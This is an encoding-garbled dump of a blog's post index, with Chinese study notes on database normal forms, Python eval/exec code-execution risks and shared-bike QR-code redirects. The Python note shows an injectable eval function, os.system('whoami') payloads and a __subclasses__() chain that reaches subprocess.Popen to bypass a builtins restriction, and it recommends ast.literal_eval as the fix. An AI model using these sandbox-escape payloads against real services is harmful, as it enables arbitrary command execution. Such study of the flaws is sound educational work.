æ­¤è€ƒè™‘å¦å¤–ä¸€ç§æ¯”BCNFå¼±çš„èŒƒå¼ï¼Œå®ƒå…è®¸ä¿æŒä¾èµ–ï¼Œè¯¥èŒƒå¼ç§°ä¸ºç¬¬ä¸‰èŒƒå¼\nç¬¬ä¸‰èŒƒå¼ å…³ç³»æ¨¡å¼Rå±äºç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰çš„æ¡ä»¶ï¼šå¯¹äºæ‰€æœ‰ Î± â†’ Î² in F* ï¼Œä»¥ä¸‹è‡³å°‘ä¸€é¡¹æˆç«‹ï¼š\n Î± â†’ Î² æ˜¯ä¸€ä¸ªå¹³å‡¡çš„å‡½æ•°ä¾èµ–ï¼ˆÎ² âˆˆ Î± ï¼‰ Î± æ˜¯ Rçš„ä¸€ä¸ªè¶…ç  Î² - Î± ä¸­çš„æ¯ä¸ªå±æ€§Aéƒ½åŒ…å«äºRçš„ä¸€ä¸ªå€™é€‰ç ä¸­ï¼ˆNoteï¼šæ¯ä¸ªå±æ€§Aå¯èƒ½åŒ…å«äºä¸åŒçš„å€™é€‰ç ä¸­ï¼‰  ä»»ä½•æ»¡è¶³BCNFçš„æ¨¡å¼ä¹Ÿæ»¡è¶³3NFï¼ˆå› ä¸ºä»–çš„æ¯ä¸ªå‡½æ•°ä¾èµ–éƒ½å°†æ»¡è¶³å‰ä¸¤ä¸ªæ¡ä»¶ä¸­çš„ä¸€æ¡ï¼‰\nåœ¨æŸç§æ„ä¹‰ä¸Šï¼Œ3NFçš„ç¬¬ä¸‰ä¸ªæ¡ä»¶ä»£è¡¨BCNFæ¡ä»¶æœ€å°æ”¾å®½ï¼Œä»¥ç¡®ä¿æ¯ä¸€ä¸ªæ¨¡å¼éƒ½æœ‰ä¿æŒä¾èµ–çš„3NFåˆ†è§£\nä½¿ç”¨å‡½æ•°ä¾èµ–è¿›è¡Œåˆ†è§£ å‡½æ•°ä¾èµ–ç†è®º åˆ†è§£ç®—æ³• ä½¿ç”¨å¤šå€¼ä¾èµ–çš„åˆ†è§£ æ›´å¤šçš„èŒƒå¼ æ•°æ®åº“è®¾è®¡è¿‡ç¨‹ æ—¶æ€æ•°æ®å»ºæ¨¡ æ•°æ®å­˜å‚¨å’Œæ•°æ®è®¿é—® æŸ¥è¯¢å¤„ç†å’ŒæŸ¥è¯¢ä¼˜åŒ– äº‹åŠ¡ç®¡ç† æŸ¥è¯¢ä»£ä»·\nå¤šå€¼ä¾èµ–\nå†²çªä¸²è¡ŒåŒ–\n211.87.227.230:3306\nwebteach\n","description":"","tags":["Database","studyNote"],"title":"Database-System","uri":"/posts/database-system/"},{"categories":[],"content":"Pythonä¸­æœ‰æ½œåœ¨ä»£ç æ‰§è¡Œé£é™©çš„å‡½æ•°  å‚è€ƒï¼š\nPythonä¸­æœ‰æ½œåœ¨ä»£ç æ‰§è¡Œé£é™©çš„å‡½æ•°(ä¸€)\n åœ¨Pythonä¸­ä¸€äº›å‡½æ•°å­˜åœ¨ç€ä»»æ„ä»£ç æ‰§è¡Œçš„éšæ‚£ï¼Œé”™è¯¯çš„ä½¿ç”¨è¿™äº›æ–¹æ³•å°†ä¼šå¯¼è‡´æ¼æ´çš„äº§ç”Ÿï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™äº›å®‰å…¨éšæ‚£è¿›è¡Œæ”»å‡»ã€‚\nç¬¬ä¸€ç»„ ç»å…¸çš„ä¸¤ä¸ªå­˜åœ¨æ‰§è¡Œä»£ç éšæ‚£çš„å‡½æ•° eval() å’Œ exec()\nåœ¨pythonä¸­ï¼Œevalå’Œexec çš„ç”¨æ³•æå…¶ç›¸ä¼¼ã€‚evalå’Œexecéƒ½å¯ä»¥å°†ä¼ å…¥çš„å­—ç¬¦ä¸²æ‰§è¡Œï¼Œä½†ä¸¤è€…åˆæœ‰ä¸åŒä¹‹å¤„\neval evalæ˜¯ä¸€ä¸ªpythonå†…ç½®å‡½æ•°ï¼Œè¯­æ³•ä¸ºeval(expression, globals=None,locals=None)\nevalå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼šå…¶ä¸­\n  expressionå‚æ•°æ˜¯ç”¨åšè¿ç®—çš„å­—ç¬¦ä¸²ç±»å‹è¡¨è¾¾å¼ï¼›\n  globalså‚æ•°ç”¨äºæŒ‡å®šè¿è¡Œæ—¶çš„å…¨å±€å‘½åç©ºé—´ï¼›\n  Localså‚æ•°ç”¨äºæŒ‡å®šè¿è¡Œæ—¶çš„å±€éƒ¨å‘½åç©ºé—´ã€‚\n  globalsä¸ locals æ˜¯å¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼æ˜¯ Noneï¼Œä»–ä»¬åªåœ¨è¿ç®—æ—¶èµ·ä½œç”¨ï¼Œè¿ç®—ååˆ™é”€æ¯ã€‚\nexec åœ¨Python2ä¸­execæ˜¯ä¸€ä¸ªå†…ç½®è¯­å¥(statement)è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯åˆ°äº†Python3ä¸­execå°†Python2ä¸­ä½œä¸ºå†…ç½®è¯­å¥çš„execå’Œexecfile()å‡½æ•°åŠŸèƒ½æ•´åˆåˆ°ä¸€èµ·ï¼Œæˆä¸ºäº†ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œè¯­æ³•ä¸ºexec(object[, globals[,locals]])\nexecçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯code objectï¼Œå› æ­¤å®ƒå¯ä»¥æ‰§è¡Œå¤æ‚çš„ä»£ç é€»è¾‘ï¼Œä¾‹å¦‚å˜é‡èµ‹å€¼æ“ä½œç­‰ï¼Œè¿™ä¸€ç‚¹æ˜¯evalåšä¸åˆ°çš„ã€‚ä½†execè¿”å›å€¼æ°¸è¿œä¸º Noneï¼Œå› æ­¤execä¸èƒ½åƒevalä¸€æ ·å°†è®¡ç®—ç»“æœè¿”å›ã€‚execçš„åä¸¤ä¸ªå‚æ•°ä¸evalä¸€è‡´ã€‚ï¼ˆæ‰€ä»¥evalé€šå¸¸å¯ä»¥å½“ä½œæ˜¯ä¸€ä¸ªè®¡ç®—å™¨ï¼Œè®¡ç®—ä¸€ä¸²å­—ç¬¦çš„å€¼ï¼‰\nå¯¹æ¯”ï¼š   åœ¨æ‰§è¡Œpythonè¯­å¥ä¸Šä¸åŒ   exec()å¯ä»¥å¯¹å˜é‡aè¿›è¡Œèµ‹å€¼ï¼Œè€Œeval()å¹¶ä¸èƒ½å¯¹aè¿›è¡Œèµ‹å€¼\nexec()å¯ä»¥æ‰§è¡Œpythonçš„import osï¼Œè€Œeval()ä¸èƒ½ç›´æ¥æ‰§è¡Œpythonè¯­å¥ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œè¡¨è¾¾å¼'__import__(\"os\")'å¹¶è¿”å›ç»“æœ\n __import__()å‡½æ•°ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œå¯ä»¥å°†è¯¥å¼•å…¥æ¨¡å—ä½œä¸ºä¸€ä¸ªåŠ¨æ€å¯¹è±¡ä½¿ç”¨\n ç›¸è¾ƒäºexecï¼š\n  è¿”å›å€¼ä¸åŒ   ç”±å›¾å¯è§ï¼Œevalåœ¨å¯¹è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—åï¼Œè¿”å›è®¡ç®—ç»“æœï¼Œè€Œexecå¹¶æ— è¿”å›ç»“æœ\nè™½ç„¶æœ‰ç§ç§ä¸åŒï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šå°†ç¬¬ä¸€ä¸ªä¼ å…¥å‚æ•°è¿›è¡Œæ‰§è¡Œ\nå­˜åœ¨çš„å®‰å…¨éšæ‚£ ä»¥eval()å‡½æ•°ä¸ºä¾‹ï¼Œä¸‹å›¾ä¸­çš„addå‡½æ•°ä½¿ç”¨eval()å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå°†ä¼ å…¥çš„aï¼Œbæ‹¼æ¥èµ·æ¥é€šè¿‡eval()è®¡ç®—è¿”å›ç»“æœ\n1 2  def add(a, b): return eval(\"%s+ %s\" % (a, b))   é€šè¿‡evalè¿›è¡Œæ‰§è¡Œè¡¨è¾¾å¼\n1 2 3  add(\"__import__('os').system('whoami')\", 2) eval(\"__import__('os').system('whoami')\") add(\"__import__('os').system('whoami') #\", 2)   æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶è¿”å›ç»“æœ2ã€‚\nè¿”å›ç»“æœ0æ˜¯å› ä¸ºos.system()æ‰§è¡ŒæˆåŠŸçš„è¯ï¼Œè¿”å›å€¼ä¸º0ã€‚\nå¦‚åŒsqlæ³¨å…¥ä¸€æ ·çš„æ€è·¯ï¼Œåœ¨æ‰§è¡Œè¯­å¥åé¢åŠ ä¸Šæ³¨é‡Šï¼Œå³å¯è¿”å›ç»“æœ0ã€‚\né˜²èŒƒ é€šè¿‡ä¸Šé¢å¯çŸ¥ï¼Œåªè¦evalæˆ–execä¸­çš„ä¼ å…¥å˜é‡å¯æ§ï¼Œå°±å­˜åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„é—®é¢˜\né’ˆå¯¹ä¸Šé¢çš„ä¾‹å­eval(\"__import__('os').system('whoami')\")çš„é—®é¢˜ï¼Œå­˜åœ¨ä¸€ç§å¸¸è§çš„é™åˆ¶æ–¹æ³•ï¼šå³æŒ‡å®ševal()æˆ–exec()çš„globalså‚æ•°ä¸º{'builtins':None}æˆ–è€…{'builtins':{}}è¿™æ ·çš„å½¢å¼å°±å¯ä»¥é¿å…ä»»æ„ä»£ç æ‰§è¡Œçš„éšæ‚£ã€‚è¿™ç§æ–¹æ³•å®é™…ä¸Šæ˜¯é™åˆ¶äº†ä»–ä»¬å¯ç”¨çš„pythonå†…ç½®æ¨¡å—(builtins)\nåœ¨eval()å’Œexec() ï¼Œglobalså‚æ•°ç”¨äºæŒ‡å®šè¿è¡Œæ—¶çš„å…¨å±€å‘½åç©ºé—´ï¼Œå¦‚æœglobalsæ²¡æœ‰è¢«æä¾›ï¼Œåˆ™ä½¿ç”¨pythonçš„å…¨å±€å‘½åç©ºé—´\nå¦‚ä¸Šå›¾ï¼Œè‹¥ä¸è§„å®šglobalså‚æ•°ï¼Œåˆ™ä½¿ç”¨pythonå…¨å±€çš„a=1ï¼Œè‹¥æä¾›äº†globalså‚æ•°{'a':6}ï¼Œåˆ™ä½¿ç”¨globalså‚æ•°é‡Œçš„æ•°æ®ï¼Œå³evalçš„ä½œç”¨åŸŸå°±æ˜¯{'a':6}\nè€Œä¸”å½“evalä½¿ç”¨äº†è‡ªå·±ä½œç”¨åŸŸé‡Œçš„å‚æ•°ï¼Œå°±ä¸ä¼šä½¿ç”¨pythonçš„å…¨å±€å‘½åç©ºé—´\npythonçš„builtinsæ¨¡å— builtinsæ¨¡å—æ˜¯æä¾›å¯¹pythonçš„æ‰€æœ‰â€œå†…å»ºâ€æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®åŠŸèƒ½ã€‚pythonè§£é‡Šå™¨åœ¨åŠ è½½æ—¶ä¼šé¦–å…ˆåŠ è½½å†…å»ºåç§°ç©ºé—´å¹¶è‡ªåŠ¨å¯¼å…¥æ‰€å¯¹åº”çš„å†…å»ºå‡½æ•°ï¼Œåœ¨æ‰§è¡Œpythonçš„æ—¶å€™åŠ ä¸Š-vçš„é€‰æ‹©å°±å¯ä»¥çœ‹åˆ°åŠ è½½è¿‡ç¨‹ã€‚\n pythonæºç åˆ†æâ€”â€”å†…å»ºæ¨¡å—builtinsåˆå§‹åŒ–\n è€Œä¸”ç”±äºbuiltinsçš„å­˜åœ¨ï¼Œä½¿å¾—åœ¨Pythonå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å†…å»ºå‡½æ•°è€Œä¸ç”¨æ˜¾å¼çš„å¯¼å…¥å®ƒä»¬ï¼Œä¾‹å¦‚input()ã€list()ã€import ç­‰\né€šè¿‡å‘½ä»¤dir(__builtins__)å°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å†…å»ºå‡½æ•°\nåœ¨pythonä¸­ä½¿ç”¨ä¸Šè¿°å‡½æ•°éƒ½å¯ä»¥ä¸ç”¨å¯¼å…¥æ¨¡å—\nå›åˆ°exec/evalé—®é¢˜ä¸­ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨exec/evalä¸­ï¼Œè‹¥globalså‚æ•°è¢«æä¾›ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›è‡ªå®šä¹‰çš„builtinsï¼Œé‚£ä¹ˆexec/evalä¼šå°†å½“å‰ç¯å¢ƒä¸­çš„builtinsæ‹·è´è‡³è‡ªå·±æä¾›çš„globalsé‡Œï¼Œä¾‹å­å¦‚ä¸‹å›¾ï¼š\nå¦‚å›¾ï¼Œè‹¥globalsé‡Œä¸è§„å®š__builtins__ï¼Œåˆ™ä¼šä½¿ç”¨pythonå…¨å±€çš„builtinsï¼Œä¾‹å¦‚in[25]ã€‚å¦‚æœå®šä¹‰äº†builtinsï¼Œåˆ™ä¼šä½¿ç”¨å·²ç»å®šä¹‰çš„builtinsï¼Œå¦‚in[27]å’Œin[28]ã€‚\n è¿™é‡Œæˆ‘æ²¡ææ‡‚26ä¸ºä»€ä¹ˆä¹Ÿå¯ä»¥ï¼Œå› ä¸ºbuiltinsåœ¨python3.xçš„æ—¶å€™å·²ç»å’Œbuiltinåˆå¹¶äº†ã€‚\nåé¢å®éªŒæ—¶å‘ç°ï¼Œbuiltinså¯ä»¥è¢«å½“ä½œæ¨¡å—æ‰€importï¼Œæ‰€ä»¥æ¨æµ‹pythonåˆå§‹åŒ–çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯__builtins__ï¼Œå®éªŒè¯æ˜è¿™æ˜¯æ­£ç¡®çš„\n execçš„globalsç­–ç•¥ä¸evalç›¸åŒ\nå› æ­¤å¯ä»¥é€šè¿‡æŒ‡å®šglobalså‚æ•°ï¼Œæ¥æ§åˆ¶evalè¿è¡Œæ‰§è¡Œçš„å†…ç½®å‡½æ•°ã€‚è¿™ä¸ªæ–¹æ³•çœ‹èµ·æ¥å¾ˆæœ‰æ•ˆçš„é™åˆ¶eval/execå¯¹importç­‰å†…ç½®å‡½æ•°çš„ä½¿ç”¨ï¼Œä¼¼ä¹å¯ä»¥é˜²æ­¢ä»»æ„ä»£ç æ‰§è¡Œã€‚ä½†æ˜¯æ­¤æ–¹æ³•ä»ç„¶å­˜åœ¨ç»•è¿‡\nç»•è¿‡ åœ¨ä¸Šè¿°é˜²èŒƒä¸­ï¼Œé€šè¿‡globalså‚æ•°å¯¹builtinsä¸­çš„å†…ç½®å‡½æ•°èŒƒå›´è¿›è¡Œé™åˆ¶ï¼Œä½¿å¾—eval/execæ— æ³•éšæ„ä½¿ç”¨â€importâ€ç­‰å†…ç½®å‡½æ•°æ¥è¾¾æˆé˜»æ­¢ä»»æ„ä»£ç æ‰§è¡Œ\nä½†æ˜¯å´å­˜åœ¨å¦‚ä¸‹ç»•è¿‡ï¼š(1, 2).class.bases[0].subclasses\nå¦‚å›¾ï¼Œ(1,2)æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œ__class__ç”¨äºæŸ¥çœ‹å¯¹è±¡æ‰€åœ¨çš„ç±»ï¼Œå¾ˆæ˜¾ç„¶(1,2)æ˜¯ä¸ªå…ƒç»„ç±»å‹çš„å¯¹è±¡ï¼Œå³tupleç±»\n__bases__å±æ€§è¿”å›æ‰€æœ‰ç›´æ¥çˆ¶ç±»æ‰€ç»„æˆçš„å…ƒç»„ï¼ˆç›´æ¥çˆ¶ç±»æ˜¯å› ä¸ºpythonçš„å¤šç»§æ‰¿å±æ€§æ‰€å¯¼è‡´ï¼‰\nå¦‚In[36]å¯è§å…ƒç»„ç±»å‹çš„ç›´æ¥çˆ¶ç±»æ˜¯objectç±»\n__subclasses__ å¯ç”¨æ¥è·å–ç±»çš„æ‰€æœ‰å­ç±»ï¼Œè´¼ææ€–\nå› ä¸º(1,2).__class__.__bases__[0]å·²ç»æ˜¯objectç±»äº†ï¼Œè€Œobjectç±»çš„å­ç±»ä¼—å¤šï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨çš„ç±»å°±éå¸¸ä¸°å¯Œäº†\næ¯”å¦‚listå°±åœ¨objectç±»é‡Œï¼Œå¯¹åº”ç€(1,2).__class__.__bases__[0].__subclasses__()[7]\nè¿™æ ·å°±å¯ä»¥è°ƒç”¨listå‡½æ•°ï¼Œå°†å…¶è½¬ä¸ºä¸€ä¸ªlist\næ„é€ åˆ©ç”¨é“¾çš„æ ¸å¿ƒæ–¹æ³•å°±æ˜¯ï¼šåªè¦è¿½æº¯åˆ°objectç±»å¹¶ä½¿ç”¨subclasses()ä½¿ç”¨objectå­ç±»å³å¯\nåœ¨objectå­ç±»ä¸­ï¼Œæœ‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å­ç±» subprocess.Popen\n subprocess æ¨¡å—å…è®¸ä½ ç”Ÿæˆæ–°çš„è¿›ç¨‹ï¼Œè¿æ¥å®ƒä»¬çš„è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯ç®¡é“ï¼Œå¹¶ä¸”è·å–å®ƒä»¬çš„è¿”å›ç ã€‚\nsubprocess.Popen(args, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n args è¢«ç”¨ä½œå¯åŠ¨è¿›ç¨‹çš„å‚æ•°. å¯èƒ½æ˜¯ä¸€ä¸ªåˆ—è¡¨æˆ–å­—ç¬¦ä¸². shell ï¼ˆé»˜è®¤ä¸º Falseï¼‰æŒ‡å®šæ˜¯å¦ä½¿ç”¨ shell æ‰§è¡Œç¨‹åºã€‚å¦‚æœ shell ä¸º Trueï¼Œæ›´æ¨èå°† args ä½œä¸ºå­—ç¬¦ä¸²ä¼ é€’è€Œéåºåˆ—ã€‚ stdout ä»å­è¿›ç¨‹æ•è·åˆ°çš„æ ‡å‡†è¾“å‡º. ä¸€ä¸ªå­—èŠ‚åºåˆ—, æˆ–ä¸€ä¸ªå­—ç¬¦ä¸², å¦‚æœ run() æ˜¯è®¾ç½®äº† encoding, errors æˆ–è€… text=True æ¥è¿è¡Œçš„. å¦‚æœæœªæœ‰æ•è·, åˆ™ä¸º None. å¦‚æœä½ é€šè¿‡ stderr=subprocess.STDOUT è¿è¡Œ, æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†é”™è¯¯å°†è¢«ç»„åˆåœ¨ä¸€èµ·, å¹¶ä¸” stderr` å°†ä¸º None. stderr æ•è·åˆ°çš„å­è¿›ç¨‹çš„æ ‡å‡†é”™è¯¯. ä¸€ä¸ªå­—èŠ‚åºåˆ—, æˆ–è€…ä¸€ä¸ªå­—ç¬¦ä¸², å¦‚æœ run() æ˜¯è®¾ç½®äº†å‚æ•° encoding, errors æˆ–è€… text=True è¿è¡Œçš„. å¦‚æœæœªæœ‰æ•è·, åˆ™ä¸º None.  ç®€è€Œè¨€ä¹‹ ä¸Šé¢ä»£ç ç®€è€Œè¨€ä¹‹å°±æ˜¯ï¼Œæ¥å—argsçš„å‘½ä»¤ï¼Œæ‰§è¡ŒæˆåŠŸå°±å°†æ‰§è¡ŒæˆåŠŸçš„ç»“æœå­˜å…¥stdoutç®¡é“ï¼Œæ‰§è¡Œå¤±è´¥çš„ç»“æœå­˜å…¥stderrç®¡é“ã€‚\n æ˜¾ç„¶ï¼Œåˆ©ç”¨é“¾ï¼š().__class__.bases[0].__subclasses__()[176](\"whoami\")\nå¯èƒ½ç”±äºæˆ‘çš„å¼•å…¥åº“ä¸åŒï¼Œå¯¼è‡´äº†subclassesçš„åˆ—è¡¨é€‰æ‹©ä¸åŒï¼Œæˆ‘åœ¨subclasses[217]æ‰¾åˆ°subprocess.Popenï¼Œç„¶åæˆåŠŸæ‰§è¡Œwhoamiå‘½ä»¤\næ¯ä¸ªpythonçš„è¿è¡Œç¯å¢ƒä¸åŒï¼Œå¼•å…¥åº“çš„é¡ºåºä¸åŒï¼Œå¯¼è‡´subprocessä¸ä¸€å®šåœ¨176ä½ï¼Œç”šè‡³å¯èƒ½æ²¡æœ‰è¢«å¼•å…¥\nç”±å›¾å¯è§ï¼Œè™½ç„¶å¯èƒ½æ²¡è¢«å¼•å…¥ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•èƒ½æˆåŠŸç»•è¿‡ã€‚å¯è§ï¼Œè™½ç„¶é™åˆ¶åªå…è®¸ä½¿ç”¨listï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å› æ­¤ï¼Œç®€å•çš„ä½¿ç”¨{'builtins': None}æ˜¯æ— æ³•æ»¡è¶³evalçš„å®‰å…¨éœ€æ±‚çš„\nå®é™…ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ast.literal_eval()æ¥ä»£æ›¿eval()\nast.literal_eval()å…è®¸ä¼ å…¥çš„å†…å®¹å¦‚ä¸‹\nstrings, bytes, numbers, tuples, lists, dicts, sets, booleans, None\nå½“ä¸åˆæ³•çš„å­—ç¬¦ä¼ å…¥æ—¶ï¼Œç¨‹åºåˆ™ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾\nä½¿ç”¨ast.literal_eval()ä»£æ›¿evalå’Œexecï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´\nç”šè‡³åªè¦æœ‰ä»»ä½•ä¸åˆæ³•çš„å­—ç¬¦ä¼ å…¥ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™\nä½¿ç”¨ast.literal_eval()ä»£æ›¿evalå’Œexecï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´\n æ‰©å±•ï¼š\npythonæ²™ç®±é€ƒé€¸\n ","description":"","tags":[],"title":"Functions with potential code execution risks in Python","uri":"/posts/functions-with-potential-code-execution-risks-in-python/"},{"categories":[],"content":"å…³äºpythonçš„QRCodeçš„ç”¨æ³• qrcodeçš„ç”¨æ³•\n https://blog.csdn.net/cungudafa/article/details/85871871\n åˆ©ç”¨zxingæ¨¡å—è¯»äºŒç»´ç æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  from PIL import Image import qrcode import os import zxing def make_qrcode(data): img = qrcode.make(data) img.sava(\"test.png\") im = Image.open(\"test.png\") im.show() def read_qrcode_zxing(filename): ''' logger = logging.getLogger(__name__) if not logger.handlers: logging.basicConfig(level=logging.INFO) DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == 'DEBUG') ''' img = Image.open(filename) ran = int(random.random() * 100000) img.save('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) zx = zxing.BarCodeReader()#è°ƒç”¨zxingäºŒç»´ç è¯»å–åŒ… data = '' zxdata = zx.decode('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran))#å›¾ç‰‡è§£ç  # åˆ é™¤ä¸´æ—¶æ–‡ä»¶ os.remove('%s%s.jpg' % (os.path.basename(filename).split('.')[0], ran)) if zxdata: logger.debug(u'zxingè¯†åˆ«äºŒç»´ç :%s,å†…å®¹: %s' % (filename, zxdata)) data = zxdata else: logger.error(u'è¯†åˆ«zxingäºŒç»´ç å‡ºé”™:%s' % (filename)) img.save('%s-zxing.jpg' % filename) return data   ä½†æ˜¯ï¼Œè¿™åªèƒ½è¯†åˆ«æ ‡å‡†çš„äºŒç»´ç ï¼Œå¹¶ä¸èƒ½è¯†åˆ«å›¾ç‰‡ä¸­çš„äºŒç»´ç ï¼Œç”±äºè¿™é‡Œéœ€è¦ç”¨åˆ°tesseractï¼Œå› æ­¤ç›´æ¥ç”¨äºŒç»´ç è½¯ä»¶è¿›è¡Œæ‰«ï¼ˆæ³¨æ„ä¸èƒ½ç”¨å¾®ä¿¡æ”¯ä»˜å®ä¹‹ç±»çš„ï¼Œå› ä¸ºç¢°åˆ°urlæ­¤ç±»è½¯ä»¶ä¼šç›´æ¥è·³è½¬ï¼Œå¥½åƒQQå’Œä¸€äº›ç¬¬ä¸‰æ–¹çš„æ‰«ç è½¯ä»¶ä¸ä¼šç›´æ¥è·³è½¬urlï¼Œè€Œæ˜¯æ˜¾ç¤ºå…¶æ•°æ®ï¼‰\nä¹Œäº‘çš„äºŒç»´ç æ”»å‡»  QRäºŒç»´ç çš„æ”»å‡»æ–¹æ³•ä¸é˜²å¾¡\n  ç½‘ç»œé’“é±¼ è¯±å¯¼ä¸‹è½½ã€ä¼ æ’­æ¶æ„è½¯ä»¶ éšç§æ³„éœ²  é˜²å¾¡æ–¹å¼  QRç è§£ç è¯‘ç è¿‡ç¨‹åŠ å…¥åŠ è§£å¯†ç¯èŠ‚ ç¬¬ä¸‰æ–¹ç»Ÿä¸€ç®¡ç†  æ€è€ƒ 1.åŠ å…¥åŠ è§£å¯†ç¯èŠ‚ï¼šè¿™åªæ˜¯ç¡®ä¿äº†åŸäºŒç»´ç çš„æ•°æ®çš„å®Œæ•´æ€§ï¼ŒéšåŒ¿æ€§ï¼Œå¹¶ä¸èƒ½ç¡®ä¿å…¶ä¸è¢«ä¸­é—´äººæ”»å‡»ï¼Œå³ç›´æ¥æ›¿æ¢äºŒç»´ç çš„è¡Œä¸º\nç°æœ‰å…±äº«å•è½¦æ‰«ç æ¢ç´¢ Mobike: 8650262688:\thttp://www.mobike.com/download/app.html?b=8650262688_1 8641170177:\thttp://www.mobike.com/download/app.html?b=8641170177_1 8641176319: http://www.mobike.com/download/app.html?b=8641176319_1 hello bike: 3110469617: http://c3x.me/?n=3110469617 3110457021: http://c3x.me/?n=3110457021 5610663692:\thttp://c3x.me/?n=5610663692 didi bike: https://dc.tt/htw?id=1B24C1D\u0026p=2 https://dc.tt/htw?id=1B4910D\u0026p=2 ç”¨ç”µè„‘ç›´æ¥è®¿é—®è¯¥ç½‘å€\n  Mobikeæ˜¯ç›´æ¥è·³è½¬åˆ°appæ¨èé¡µé¢ï¼Œæ‰“å¼€ä¸‹è½½ï¼Œæ˜¯è…¾è®¯åˆä½œæ–¹çš„åº”ç”¨å®ä¸‹è½½\n  hello bikeä¹Ÿæ˜¯ç›´æ¥è·³è½¬è‡³appæ¨èé¡µé¢ï¼Œæ‰“å¼€ä¸‹è½½ï¼Œå±äºhellobikeè‡ªå·±æ­å»ºçš„ä¸‹è½½é¡µé¢\n  æ»´æ»´æ˜¯è·³è½¬åˆ°å°ç¨‹åºæ¨èé¡µé¢ï¼Œ\n  hello ç”±å›¾å¯è§ï¼Œæ˜æ˜¾çš„ä¸€ä¸ªenvå˜é‡ï¼Œæ¨æµ‹æ˜¯ç”¨æ¥åˆ¤æ–­ç”¨çš„ã€‚\nç„¶åä¸‹é¢å°±æ˜¯å¯¹encè¿›è¡Œé€»è¾‘åˆ¤æ–­ï¼Œç„¶åå¤„ç†è·³è½¬\næˆ‘çš„æµè§ˆå™¨æ˜¯è·³è½¬åˆ°äº†http://c3x.me/bike.html?n=3110469617\nhttps://c3x.me/wechat-ebike.html?n=3110469617æ˜¯å¯¹å¾®ä¿¡å†…ç½®æµè§ˆå™¨åšçš„ä¸€äº›é¡µé¢è‡ªé€‚åº”\nå†æ¬¡åº”è¯¥æ˜¯å¯¹User-Agentè¿›è¡Œåˆ¤æ–­ï¼Œå¹¶è·³è½¬è‡³ç›¸åº”é¡µé¢ï¼Œä»£ç å¦‚ä¸‹ï¼š\n // åŸºæœ¬ç¯å¢ƒåŠå‚æ•° var ua = window.navigator.userAgent; var params = {}; if (location.search) { var parts = location.search.substring(1).split('\u0026');  å…³äºwindow.navigator.userAgentï¼šhttps://blog.csdn.net/liangyihe/article/details/78464656\n ä»¥ä¸‹æ˜¯è‹¹æœçš„useragentï¼Œç”¨å»æ›¿æ¢\nUserAgent:Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 æœç„¶æ˜¯åŒä¸€ä¸ªé¡µé¢çš„ä¸åŒé€‚åº”æ€§å¤„ç†\nå¯¹äºaliBrowserï¼Œæ˜¯å¯¹åº”è·³è½¬åˆ°ç›¸åº”çš„ä¸‹è½½ç•Œé¢ï¼Œé‡‡ç”¨alipays://plat....\nå¯¹äºå“ˆå–½bike Appä¹Ÿæ˜¯è·³è½¬åˆ°è‡ªèº«çš„è·¯ç”±ï¼Œç„¶åå†å…¶æœåŠ¡ç«¯åšå¤„ç†\nMobike æŠ“åŒ…è®¿é—®ï¼Œå‘ç°æ˜¯ç›´æ¥301äº†ï¼ˆæ°¸ä¹…æ€§è½¬ç§»ï¼‰ï¼Œç„¶åæ²¡æ‰¾åˆ°è§£å†³åŠæ³•\nå› ä¸ºæ˜¯ç›´æ¥è·³è½¬è‡³ä¸‹è½½ç•Œé¢ï¼Œæ‰€æœ‰æ²¡æœ‰å’Œæ­¤å•è½¦åˆä½œçš„appéƒ½æ˜¯è·³è½¬è‡³ä¸‹è½½ç•Œé¢ï¼ŒæŠ“åŒ…å¤±è´¥\ndidi this.config 0 {â€¦} __method__: \"POST\" _source: \"https://page.xiaojukeji.com/m/hellopage.html?id=1B24C1D\u0026p=2\" api_version: \"1.0.1\" app_version: \"1.8.7\" appid: 30004 auto_fill_phone: true canonical_country_code: \"CN\" checkPhone: true city_id: 0 country_calling_code: \"+86\" country_filter: Array [] country_id: 156 